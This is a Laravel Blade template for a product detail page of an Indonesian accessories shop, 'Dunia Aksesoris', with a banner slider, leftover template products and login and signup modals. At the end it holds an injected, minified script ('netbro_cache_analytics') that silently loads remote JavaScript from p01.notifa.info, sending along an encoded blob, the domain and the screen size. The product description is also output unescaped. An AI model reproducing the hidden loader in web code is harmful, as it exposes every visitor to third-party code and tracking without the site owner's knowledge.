<!DOCTYPE html>
<html lang="en">

<meta http-equiv="content-type" content="text/html;charset=utf-8" />

<head>

	<!-- SITE TITTLE -->
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Dunia Aksesoris</title>

	<!-- PLUGINS CSS STYLE -->
	<link href="{{asset ('/bigbag/plugins/jquery-ui/jquery-ui.css')}}" rel="stylesheet">
	<link href="{{asset ('/bigbag/plugins/bootstrap/css/bootstrap.min.css')}}" rel="stylesheet">
	<link href="{{asset ('/bigbag/plugins/font-awesome/css/font-awesome.min.css')}}" rel="stylesheet">
	<link href="{{asset ('/bigbag/plugins/selectbox/select_option1.css')}}" rel="stylesheet">
	<link href="{{asset ('/bigbag/plugins/fancybox/jquery.fancybox.min.css')}}" rel="stylesheet">
	<link href="{{asset ('/bigbag/plugins/iziToast/css/iziToast.css')}}" rel="stylesheet">
	<link href="{{asset ('/bigbag/plugins/prismjs/prism.css')}}" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="{{asset ('/bigbag/plugins/rs-plugin/css/settings.css')}}" media="screen">
	<link rel="stylesheet" type="text/css" href="{{asset ('/bigbag/plugins/slick/slick.css')}}" media="screen">
	<link rel="stylesheet" type="text/css" href="{{asset ('/bigbag/plugins/slick/slick-theme.css')}}" media="screen">

	<!-- CUSTOM CSS -->
	<link href="{{asset ('/bigbag/css/style.css')}}" rel="stylesheet">
	<link rel="stylesheet" href="{{asset ('/bigbag/css/default.css')}}" id="option_color">
	<link rel="stylesheet" type="text/css" href="{{ asset('/css/sweetalert2.css')}}">

	<!-- Icons -->
	<link rel="shortcut icon" href="/img/head.png">

	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->

</head>
<body class="body-wrapper version1">

	<!-- Preloader -->
	<div id="preloader" class="smooth-loader-wrapper">
		<div class="preloader_container">
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
		</div>
	</div>

	<div class="main-wrapper">

		<!-- HEADER -->
		<div class="header clearfix">

			<!-- NAVBAR -->
			@include('partials.frontend.navbar')
		</div>
	</div> <!-- End Wrapper -->

	<!-- BANNER --><div class="bannercontainer bannerV1">
		<div class="fullscreenbanner-container">
			<div class="fullscreenbanner">
				<ul>
					<li data-transition="slidehorizontal" data-slotamount="5" data-masterspeed="700" data-title="Slide 1">
						<img src="/img/slider-bg.jpg" alt="slidebg1" data-bgfit="cover" data-bgposition="center center" data-bgrepeat="no-repeat">
						<div class="slider-caption slider-captionV1 container">

							<div class="tp-caption rs-caption-1 sft start"
								data-hoffset="0"
								data-x="700"
								data-y="0"
								data-speed="800"
								data-start="1500"
								data-easing="Back.easeInOut"
								data-endspeed="300" >
								<img src="/img/casingg.png" alt="slider-image" style="width:auto; height:auto;">
							</div>

							<div class="tp-caption rs-caption-2 sft"
								data-hoffset="0"
								data-y="100"
								data-x="[15,15,42,15]"
								data-speed="800"
								data-start="2000"
								data-easing="Back.easeInOut"
								data-endspeed="300">
								Casing Unik
							</div>

							<div class="tp-caption rs-caption-3 sft"
								data-hoffset="0"
								data-y="175"
								data-x="[15,15,42,15]"
								data-speed="1000"
								data-start="3000"
								data-easing="Power4.easeOut"
								data-endspeed="300"
								data-endeasing="Power1.easeIn"
								data-captionhidden="off">
								<br>
								<small>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque convallis turpis pharetra pretium nec eu sem.</small>
							</div>

					</div>
					</li>
					<li data-transition="slidehorizontal" data-slotamount="5" data-masterspeed="700"  data-title="Slide 2">
						<img src="/img/slider-bg.jpg" alt="slidebg" data-bgfit="cover" data-bgposition="center center" data-bgrepeat="no-repeat">
						<div class="slider-caption slider-captionV1 container">
							<div class="tp-caption rs-caption-1 sft start"
								data-hoffset="0"
								data-y="0"
								data-x="[15,15,42,15]"
								data-speed="800"
								data-start="1500"
								data-easing="Back.easeInOut"
								data-endspeed="300">
								<img src="/img/head.png" alt="slider-image" style="width:400px; height:400px;">
							</div>

							<div class="tp-caption rs-caption-2 sft "
								data-hoffset="0"
								data-y="100"
								data-x="600"
								data-speed="800"
								data-start="2000"
								data-easing="Back.easeInOut"
								data-endspeed="300">
								Headphone
							</div>

							<div class="tp-caption rs-caption-3 sft"
								data-hoffset="0"
								data-y="175"
								data-x="600"
								data-speed="1000"
								data-start="3000"
								data-easing="Power4.easeOut"
								data-endspeed="300"
								data-endeasing="Power1.easeIn"
								data-captionhidden="off">
								<br>
								<small>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque convallis turpis pharetra pretium nec eu sem.</small>
							</div>

							<div class="tp-caption rs-caption-4 sft"
								data-hoffset="0"
								data-y="310"
								data-x="600"
								data-speed="800"
								data-start="3500"
								data-easing="Power4.easeOut"
								data-endspeed="300"
								data-endeasing="Power1.easeIn"
								data-captionhidden="off">
							</div>
						</div>
					</li>
					<li data-transition="slidehorizontal" data-slotamount="5" data-masterspeed="700" data-title="Slide 3">
						<img src="/img/slider-bg.jpg" alt="slidebg1" data-bgfit="cover" data-bgposition="center center" data-bgrepeat="no-repeat">
						<div class="slider-caption slider-captionV1 container">

							<div class="tp-caption rs-caption-1 sft start"
								data-hoffset="0"
								data-x="700"
								data-y="54"
								data-speed="800"
								data-start="1500"
								data-easing="Back.easeInOut"
								data-endspeed="300" >
								<img src="/img/sb.png" alt="slider-image" style="width:400px; height:400px;">
							</div>

							<div class="tp-caption rs-caption-2 sft"
								data-hoffset="0"
								data-y="100"
								data-x="[15,15,42,15]"
								data-speed="800"
								data-start="2000"
								data-easing="Back.easeInOut"
								data-endspeed="300">
								Speaker Bluetooth
							</div>

							<div class="tp-caption rs-caption-3 sft"
								data-hoffset="0"
								data-y="175"
								data-x="[15,15,42,15]"
								data-speed="1000"
								data-start="3000"
								data-easing="Power4.easeOut"
								data-endspeed="300"
								data-endeasing="Power1.easeIn"
								data-captionhidden="off">
								<br>
								<small>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque convallis turpis pharetra pretium nec eu sem.</small>
							</div>

							<div class="tp-caption rs-caption-4 sft"
								data-hoffset="0"
								data-y="310"
								data-x="[15,15,42,15]"
								data-speed="800"
								data-start="3500"
								data-easing="Power4.easeOut"
								data-endspeed="300"
								data-endeasing="Power1.easeIn"
								data-captionhidden="off">
							</div>
						</div>
					</li>
				</ul>
			</div>
		</div>
	</div>
	<!-- End Banner -->

	<!-- MAIN CONTENT SECTION -->
	<section class="mainContent clearfix">
		<div class="container">

			<div class="page-header">
				<h4>View Detail</h4>
			</div>
			<div class="row featuredCollection margin-bottom">
				<div class="col-md-12 col-12">
						<div class="imageWrapper">
							<img src="{{ asset('/img/'.$barangs->foto)}}" alt="feature-collection-image" style="height:500px; width:500px;">
							<div class="caption"><br>
								<h3>{{$barangs->nama_barang}}</h3><br>
								<p>Rp {{$barangs->harga}},-</p>
								<p>{!!($barangs->deskripsi)!!}</p>
							</div>
						</div>
					</div>	
				</div>
				@yield('product')
				<!-- <div class="slide col-md-3">
					<div class="productImage">
						<img src="bigbag/img/home/featured-product/product-02.jpg" alt="featured-product-img">
						<div class="productMasking">
							<ul class="list-inline btn-group" role="group">
								<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
								<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
								<li><a data-toggle="modal" href="-2.html" class="btn btn-default"><i class="fa fa-eye"></i></a></li>
							</ul>
						</div>
					</div>
					<div class="productCaption">
						<a href="single-product.html">
							<h4>Dip Dyed Sweater</h4>
						</a>
						<h3>$149.00</h3>
					</div>
				</div>
				<div class="slide col-md-3">
					<div class="productImage">
						<img src="bigbag/img/home/featured-product/product-03.jpg" alt="featured-product-img">
						<div class="productMasking">
							<ul class="list-inline btn-group" role="group">
								<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
								<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
								<li><a data-toggle="modal" href="-2.html" class="btn btn-default"><i class="fa fa-eye"></i></a></li>
							</ul>
						</div>
					</div>
					<div class="productCaption">
						<a href="single-product.html">
							<h4>Scarf Ring Corner</h4>
						</a>
						<h3>$79</h3>
					</div>
				</div>
				<div class="slide col-md-3">
					<div class="productImage">
						<img src="bigbag/img/home/featured-product/product-04.jpg" alt="featured-product-img">
						<div class="productMasking">
							<ul class="list-inline btn-group" role="group">
								<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
								<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
								<li><a data-toggle="modal" href="-2.html" class="btn btn-default"><i class="fa fa-eye"></i></a></li>
							</ul>
						</div>
					</div>
					<div class="productCaption">
						<a href="single-product.html">
							<h4>Sun Buddies</h4>
						</a>
						<h3>$109</h3>
					</div>
				</div>
				<div class="slide col-md-3">
					<div class="productImage">
						<img src="bigbag/img/home/featured-product/product-05.jpg" alt="featured-product-img">
						<div class="productMasking">
							<ul class="list-inline btn-group" role="group">
								<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
								<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
								<li><a data-toggle="modal" href="-2.html" class="btn btn-default"><i class="fa fa-eye"></i></a></li>
							</ul>
						</div>
					</div>
					<div class="productCaption">
						<a href="single-product.html">
							<h4>Scarf Ring Corner</h4>
						</a>
						<h3>$79</h3>
					</div>
				</div>
				<div class="slide col-md-3">
					<div class="productImage">
						<img src="bigbag/img/home/featured-product/product-06.jpg" alt="featured-product-img">
						<div class="productMasking">
							<ul class="list-inline btn-group" role="group">
								<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
								<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
								<li><a data-toggle="modal" href="-2.html" class="btn btn-default"><i class="fa fa-eye"></i></a></li>
							</ul>
						</div>
					</div>
					<div class="productCaption">
						<a href="single-product.html">
							<h4>Scarf Ring Corner</h4>
						</a>
						<h3>$79</h3>
					</div>
				</div>
				<div class="slide col-md-3">
					<div class="productImage">
						<img src="bigbag/img/home/featured-product/product-07.jpg" alt="featured-product-img">
						<div class="productMasking">
							<ul class="list-inline btn-group" role="group">
								<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
								<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
								<li><a data-toggle="modal" href="-2.html" class="btn btn-default"><i class="fa fa-eye"></i></a></li>
							</ul>
						</div>
					</div>
					<div class="productCaption">
						<a href="single-product.html">
							<h4>Scarf Ring Corner</h4>
						</a>
						<h3>$79</h3>
					</div>
				</div>
				<div class="slide col-md-3">
					<div class="productImage">
						<img src="bigbag/img/home/featured-product/product-09.jpg" alt="featured-product-img">
						<div class="productMasking">
							<ul class="list-inline btn-group" role="group">
								<li><a class="btn btn-default btn-wishlist"><i class="fa fa-heart-o"></i></a></li>
								<li><a href="javascript:void(0)" class="btn btn-default" data-toast data-toast-type="success" data-toast-position="topRight" data-toast-icon="icon-circle-check" data-toast-title="Product" data-toast-message="successfuly added to cart!" class="btn btn-default"><i class="fa fa-shopping-basket"></i></a></li>
								<li><a data-toggle="modal" href="-2.html" class="btn btn-default"><i class="fa fa-eye"></i></a></li>
							</ul>
						</div>
					</div>
					<div class="productCaption">
						<a href="single-product.html">
							<h4>Scarf Ring Corner</h4>
						</a>
						<h3>$79</h3>
					</div>
				</div>
			</div>

			<!-- <div class="page-header">
				<h4>Latest Articles</h4>
			</div>

			<div class="row latestArticles">
				<div class="col-md-4">
					<div class="thumbnail">
						<a href="blog-single-right-sidebar.html">
							<img src="bigbag/img/home/articles/articles-01.jpg" alt="article-image">
						</a>
						<div class="date-holder">
							<p>08</p>
							<span>NOV</span>
						</div>
						<h5><a href="blog-single-right-sidebar.html">Leo Vitae Nibh Malesuada.</a></h5>
						<span class="meta"> by <a class="pr-1" href="#">Abdus</a> / <a class="pl-1" href="blog-single-right-sidebar.html">5 Comments</a></span>
						<div class="caption">
							<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque convallis nulla sed turpis pharetra pretium nec eu sem.</p>
						</div>
					</div>
				</div>
				<div class="col-md-4">
					<div class="thumbnail">
						<a href="blog-single-right-sidebar.html">
							<img src="bigbag/img/home/articles/articles-02.jpg" alt="article-image">
						</a>
						<div class="date-holder">
							<p>29</p>
							<span>OCT</span>
						</div>
						<h5><a href="blog-single-right-sidebar.html">Malesuada Pulvinar Quis Fring.</a></h5>
						<span class="meta"> by <a class="pr-1" href="#">Abdus</a> / <a class="pl-1" href="blog-single-right-sidebar.html">4 Comments</a></span>
						<div class="caption">
							<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque convallis nulla sed turpis pharetra pretium nec eu sem.</p>
						</div>
					</div>
				</div>
				<div class="col-md-4">
					<div class="thumbnail">
						<a href="blog-single-right-sidebar.html">
							<img src="bigbag/img/home/articles/articles-03.jpg" alt="article-image">
						</a>
						<div class="date-holder">
							<p>15</p>
							<span>Sep</span>
						</div>
						<h5><a href="blog-single-right-sidebar.html">Proin Lectus Sed Tincidunt Auctor.</a></h5>
						<span class="meta"> by <a class="pr-1" href="#">Abdus</a> / <a class="pl-1" href="blog-single-right-sidebar.html">3 Comments</a></span>
						<div class="caption">
							<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque convallis nulla sed turpis pharetra pretium nec eu sem.</p>
						</div>
					</div>
				</div>
			</div>
		</div> -->
	</section>

	<!-- LIGHT SECTION -->

	<!-- FOOTER -->
	@include('partials.frontend.footer')

	<!-- COPY RIGHT -->
	@include('partials.frontend.copyright')

<!-- LOGIN MODAL -->
<div class="modal fade login-modal" id="login" tabindex="-1" role="dialog">
	<div class="modal-dialog">
		<div class="modal-content">
			<div class="modal-header justify-content-center">
				<h3 class="modal-title">log in</h3>
				<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
			</div>
			<div class="modal-body">
				<form action="#" method="POST" role="form">
					<div class="form-group">
						<label for="">Enter Email</label>
						<input type="email" class="form-control" id="">
					</div>
					<div class="form-group">
						<label for="">Password</label>
						<input type="password" class="form-control" id="">
					</div>
					<div class="checkbox">
						<input id="checkbox-1" class="checkbox-custom form-check-input" name="checkbox-1" type="checkbox" checked>
						<label for="checkbox-1" class="checkbox-custom-label form-check-label">Remember me</label>
					</div>
					<button type="submit" class="btn btn-primary btn-block">log in</button>
					<button type="button" class="btn btn-link btn-block">Forgot Password?</button>
				</form>
			</div>
		</div>
	</div>
</div>

<!-- SIGN UP MODAL -->
<div class="modal fade " id="signup" tabindex="-1" role="dialog">
	<div class="modal-dialog">
		<div class="modal-content">
			<div class="modal-header justify-content-center">
				<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
				<h3 class="modal-title">Create an account</h3>
			</div>
			<div class="modal-body">
				<form action="#" method="POST" role="form">
					<div class="form-group">
						<label for="">Enter Email</label>
						<input type="email" class="form-control" id="">
					</div>
					<div class="form-group">
						<label for="">Password</label>
						<input type="password" class="form-control" id="">
					</div>
					<div class="form-group">
						<label for="">Confirm Password</label>
						<input type="password" class="form-control" id="">
					</div>
					<button type="submit" class="btn btn-primary btn-block">Sign up</button>
					<button type="button" class="btn btn-link btn-block">New User?</button>
				</form>
			</div>
		</div>
	</div>
</div>

<!-- PORDUCT QUICK VIEW MODAL -->
<div class="modal fade quick-view" tabindex="-1" role="dialog">
	<div class="modal-dialog">
		<div class="modal-content">
			<div class="modal-body">
				<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
					<div class="media flex-wrap">
					<div class="media-left px-0">
						<img class="media-object" src="img/products/quick-view/quick-view-01.jpg" alt="Image">
					</div>
					<div class="media-body">
						<h2>Old Skool Navy</h2>
						<h3>$149</h3>
						<p>Classic sneaker from Vans. Cotton canvas and suede upper. Textile lining with heel stabilizer and ankle support. Contrasting laces. Sits on a classic waffle rubber sole.</p>
						<span class="quick-drop">
							<select name="guiest_id3" id="guiest_id3" class="select-drop">
								<option value="0">Size</option>
								<option value="1">Size 1</option>
								<option value="2">Size 2</option>
								<option value="3">Size 3</option>
							</select>
						</span>
						<span class="quick-drop resizeWidth">
							<select name="guiest_id4" id="guiest_id4" class="select-drop">
								<option value="0">Qty</option>
								<option value="1">Qty 1</option>
								<option value="2">Qty 2</option>
								<option value="3">Qty 3</option>
							</select>
						</span>
						<div class="btn-area">
							<a href="#" class="btn btn-primary btn-block">Add to cart <i class="fa fa-angle-right" aria-hidden="true"></i></a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>

<script src="{{asset ('/bigbag/plugins/jquery/jquery.min.js')}}"></script>
<script src="{{asset ('/bigbag/plugins/jquery/jquery-migrate-3.0.0.min.js')}}"></script>
<script src="{{asset ('/bigbag/plugins/jquery-ui/jquery-ui.js')}}"></script>
<script src="{{asset ('/bigbag/plugins/bootstrap/js/popper.min.js')}}"></script>
<script src="{{asset ('/bigbag/plugins/bootstrap/js/bootstrap.min.js')}}"></script>
<script src="{{asset ('/bigbag/plugins/rs-plugin/js/jquery.themepunch.tools.min.js')}}"></script>
<script src="{{asset ('/bigbag/plugins/rs-plugin/js/jquery.themepunch.revolution.min.js')}}"></script>
<script src="{{asset ('/bigbag/plugins/slick/slick.js')}}"></script>
<script src="{{asset ('/bigbag/plugins/fancybox/jquery.fancybox.min.js')}}"></script>
<script src="{{asset ('/bigbag/plugins/iziToast/js/iziToast.js')}}"></script>
<script src="{{asset ('/bigbag/plugins/prismjs/prism.js')}}"></script>
<script src="{{asset ('/bigbag/plugins/selectbox/jquery.selectbox-0.1.3.min.js')}}"></script>
<script src="{{asset ('/bigbag/plugins/countdown/jquery.syotimer.js')}}"></script>
<script src="{{asset ('/bigbag/plugins/velocity/velocity.min.js')}}"></script>
<script src="{{asset ('/bigbag/js/custom.js')}}"></script>
<script src="{{asset ('/js/sweetalert2.js') }}"></script>

<!-- <link href="{{asset ('/bigbag/options/optionswitch.css')}}" rel="stylesheet">
<script src="{{asset ('/bigbag/options/optionswitcher.js')}}"></script> -->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="localhost:8000" ? "https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m9BHH5nSgM%2bHDHaaHOKAlBoAyh8%2b53QgZ6tqcKOjHCUB0sleco81Yg7jGA3WsZRvbmIW0Sw%2fRzPz58v4B%2bdR0C%2f9fcrKJ4fJkjVgoKVLcvHQU1AItiXvbz%2bObOJQ3SatdAzr%2fvxrobVGQbN%2bD4SFNNyIIsrKib6G0TiNbrLBbTcN1FnCIAHhD0Hbh0bjwsdKI1EzOoO23YZN4W%2fpnn%2fGjyxVyYNQIURmAWRxAnFa7TCm9WZIbqFkW6x0vUDmy8MgfC%2bIn9PZyZ4zrSI%2bH7wITjw2Rl9GA1L4hHjgywcKqge8VG%2bXouXN95TkSurLcdnGaLaVwHj9kXJ%2bQdY8D%2fMZdczqgiVUD9Fp87c8ZAWwBYCs31%2f66rQiYaVgY5ZOY40ATajJHF6OVHVIVLVSSQvt8LzoWdTjESM7B1HsmIV%2bmu1av0ubj5YhwU0FduC5qJ7qYvyeMwhN47Ab09VbQz2LGXXx66Nnfy%2bsX" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</body>
</html>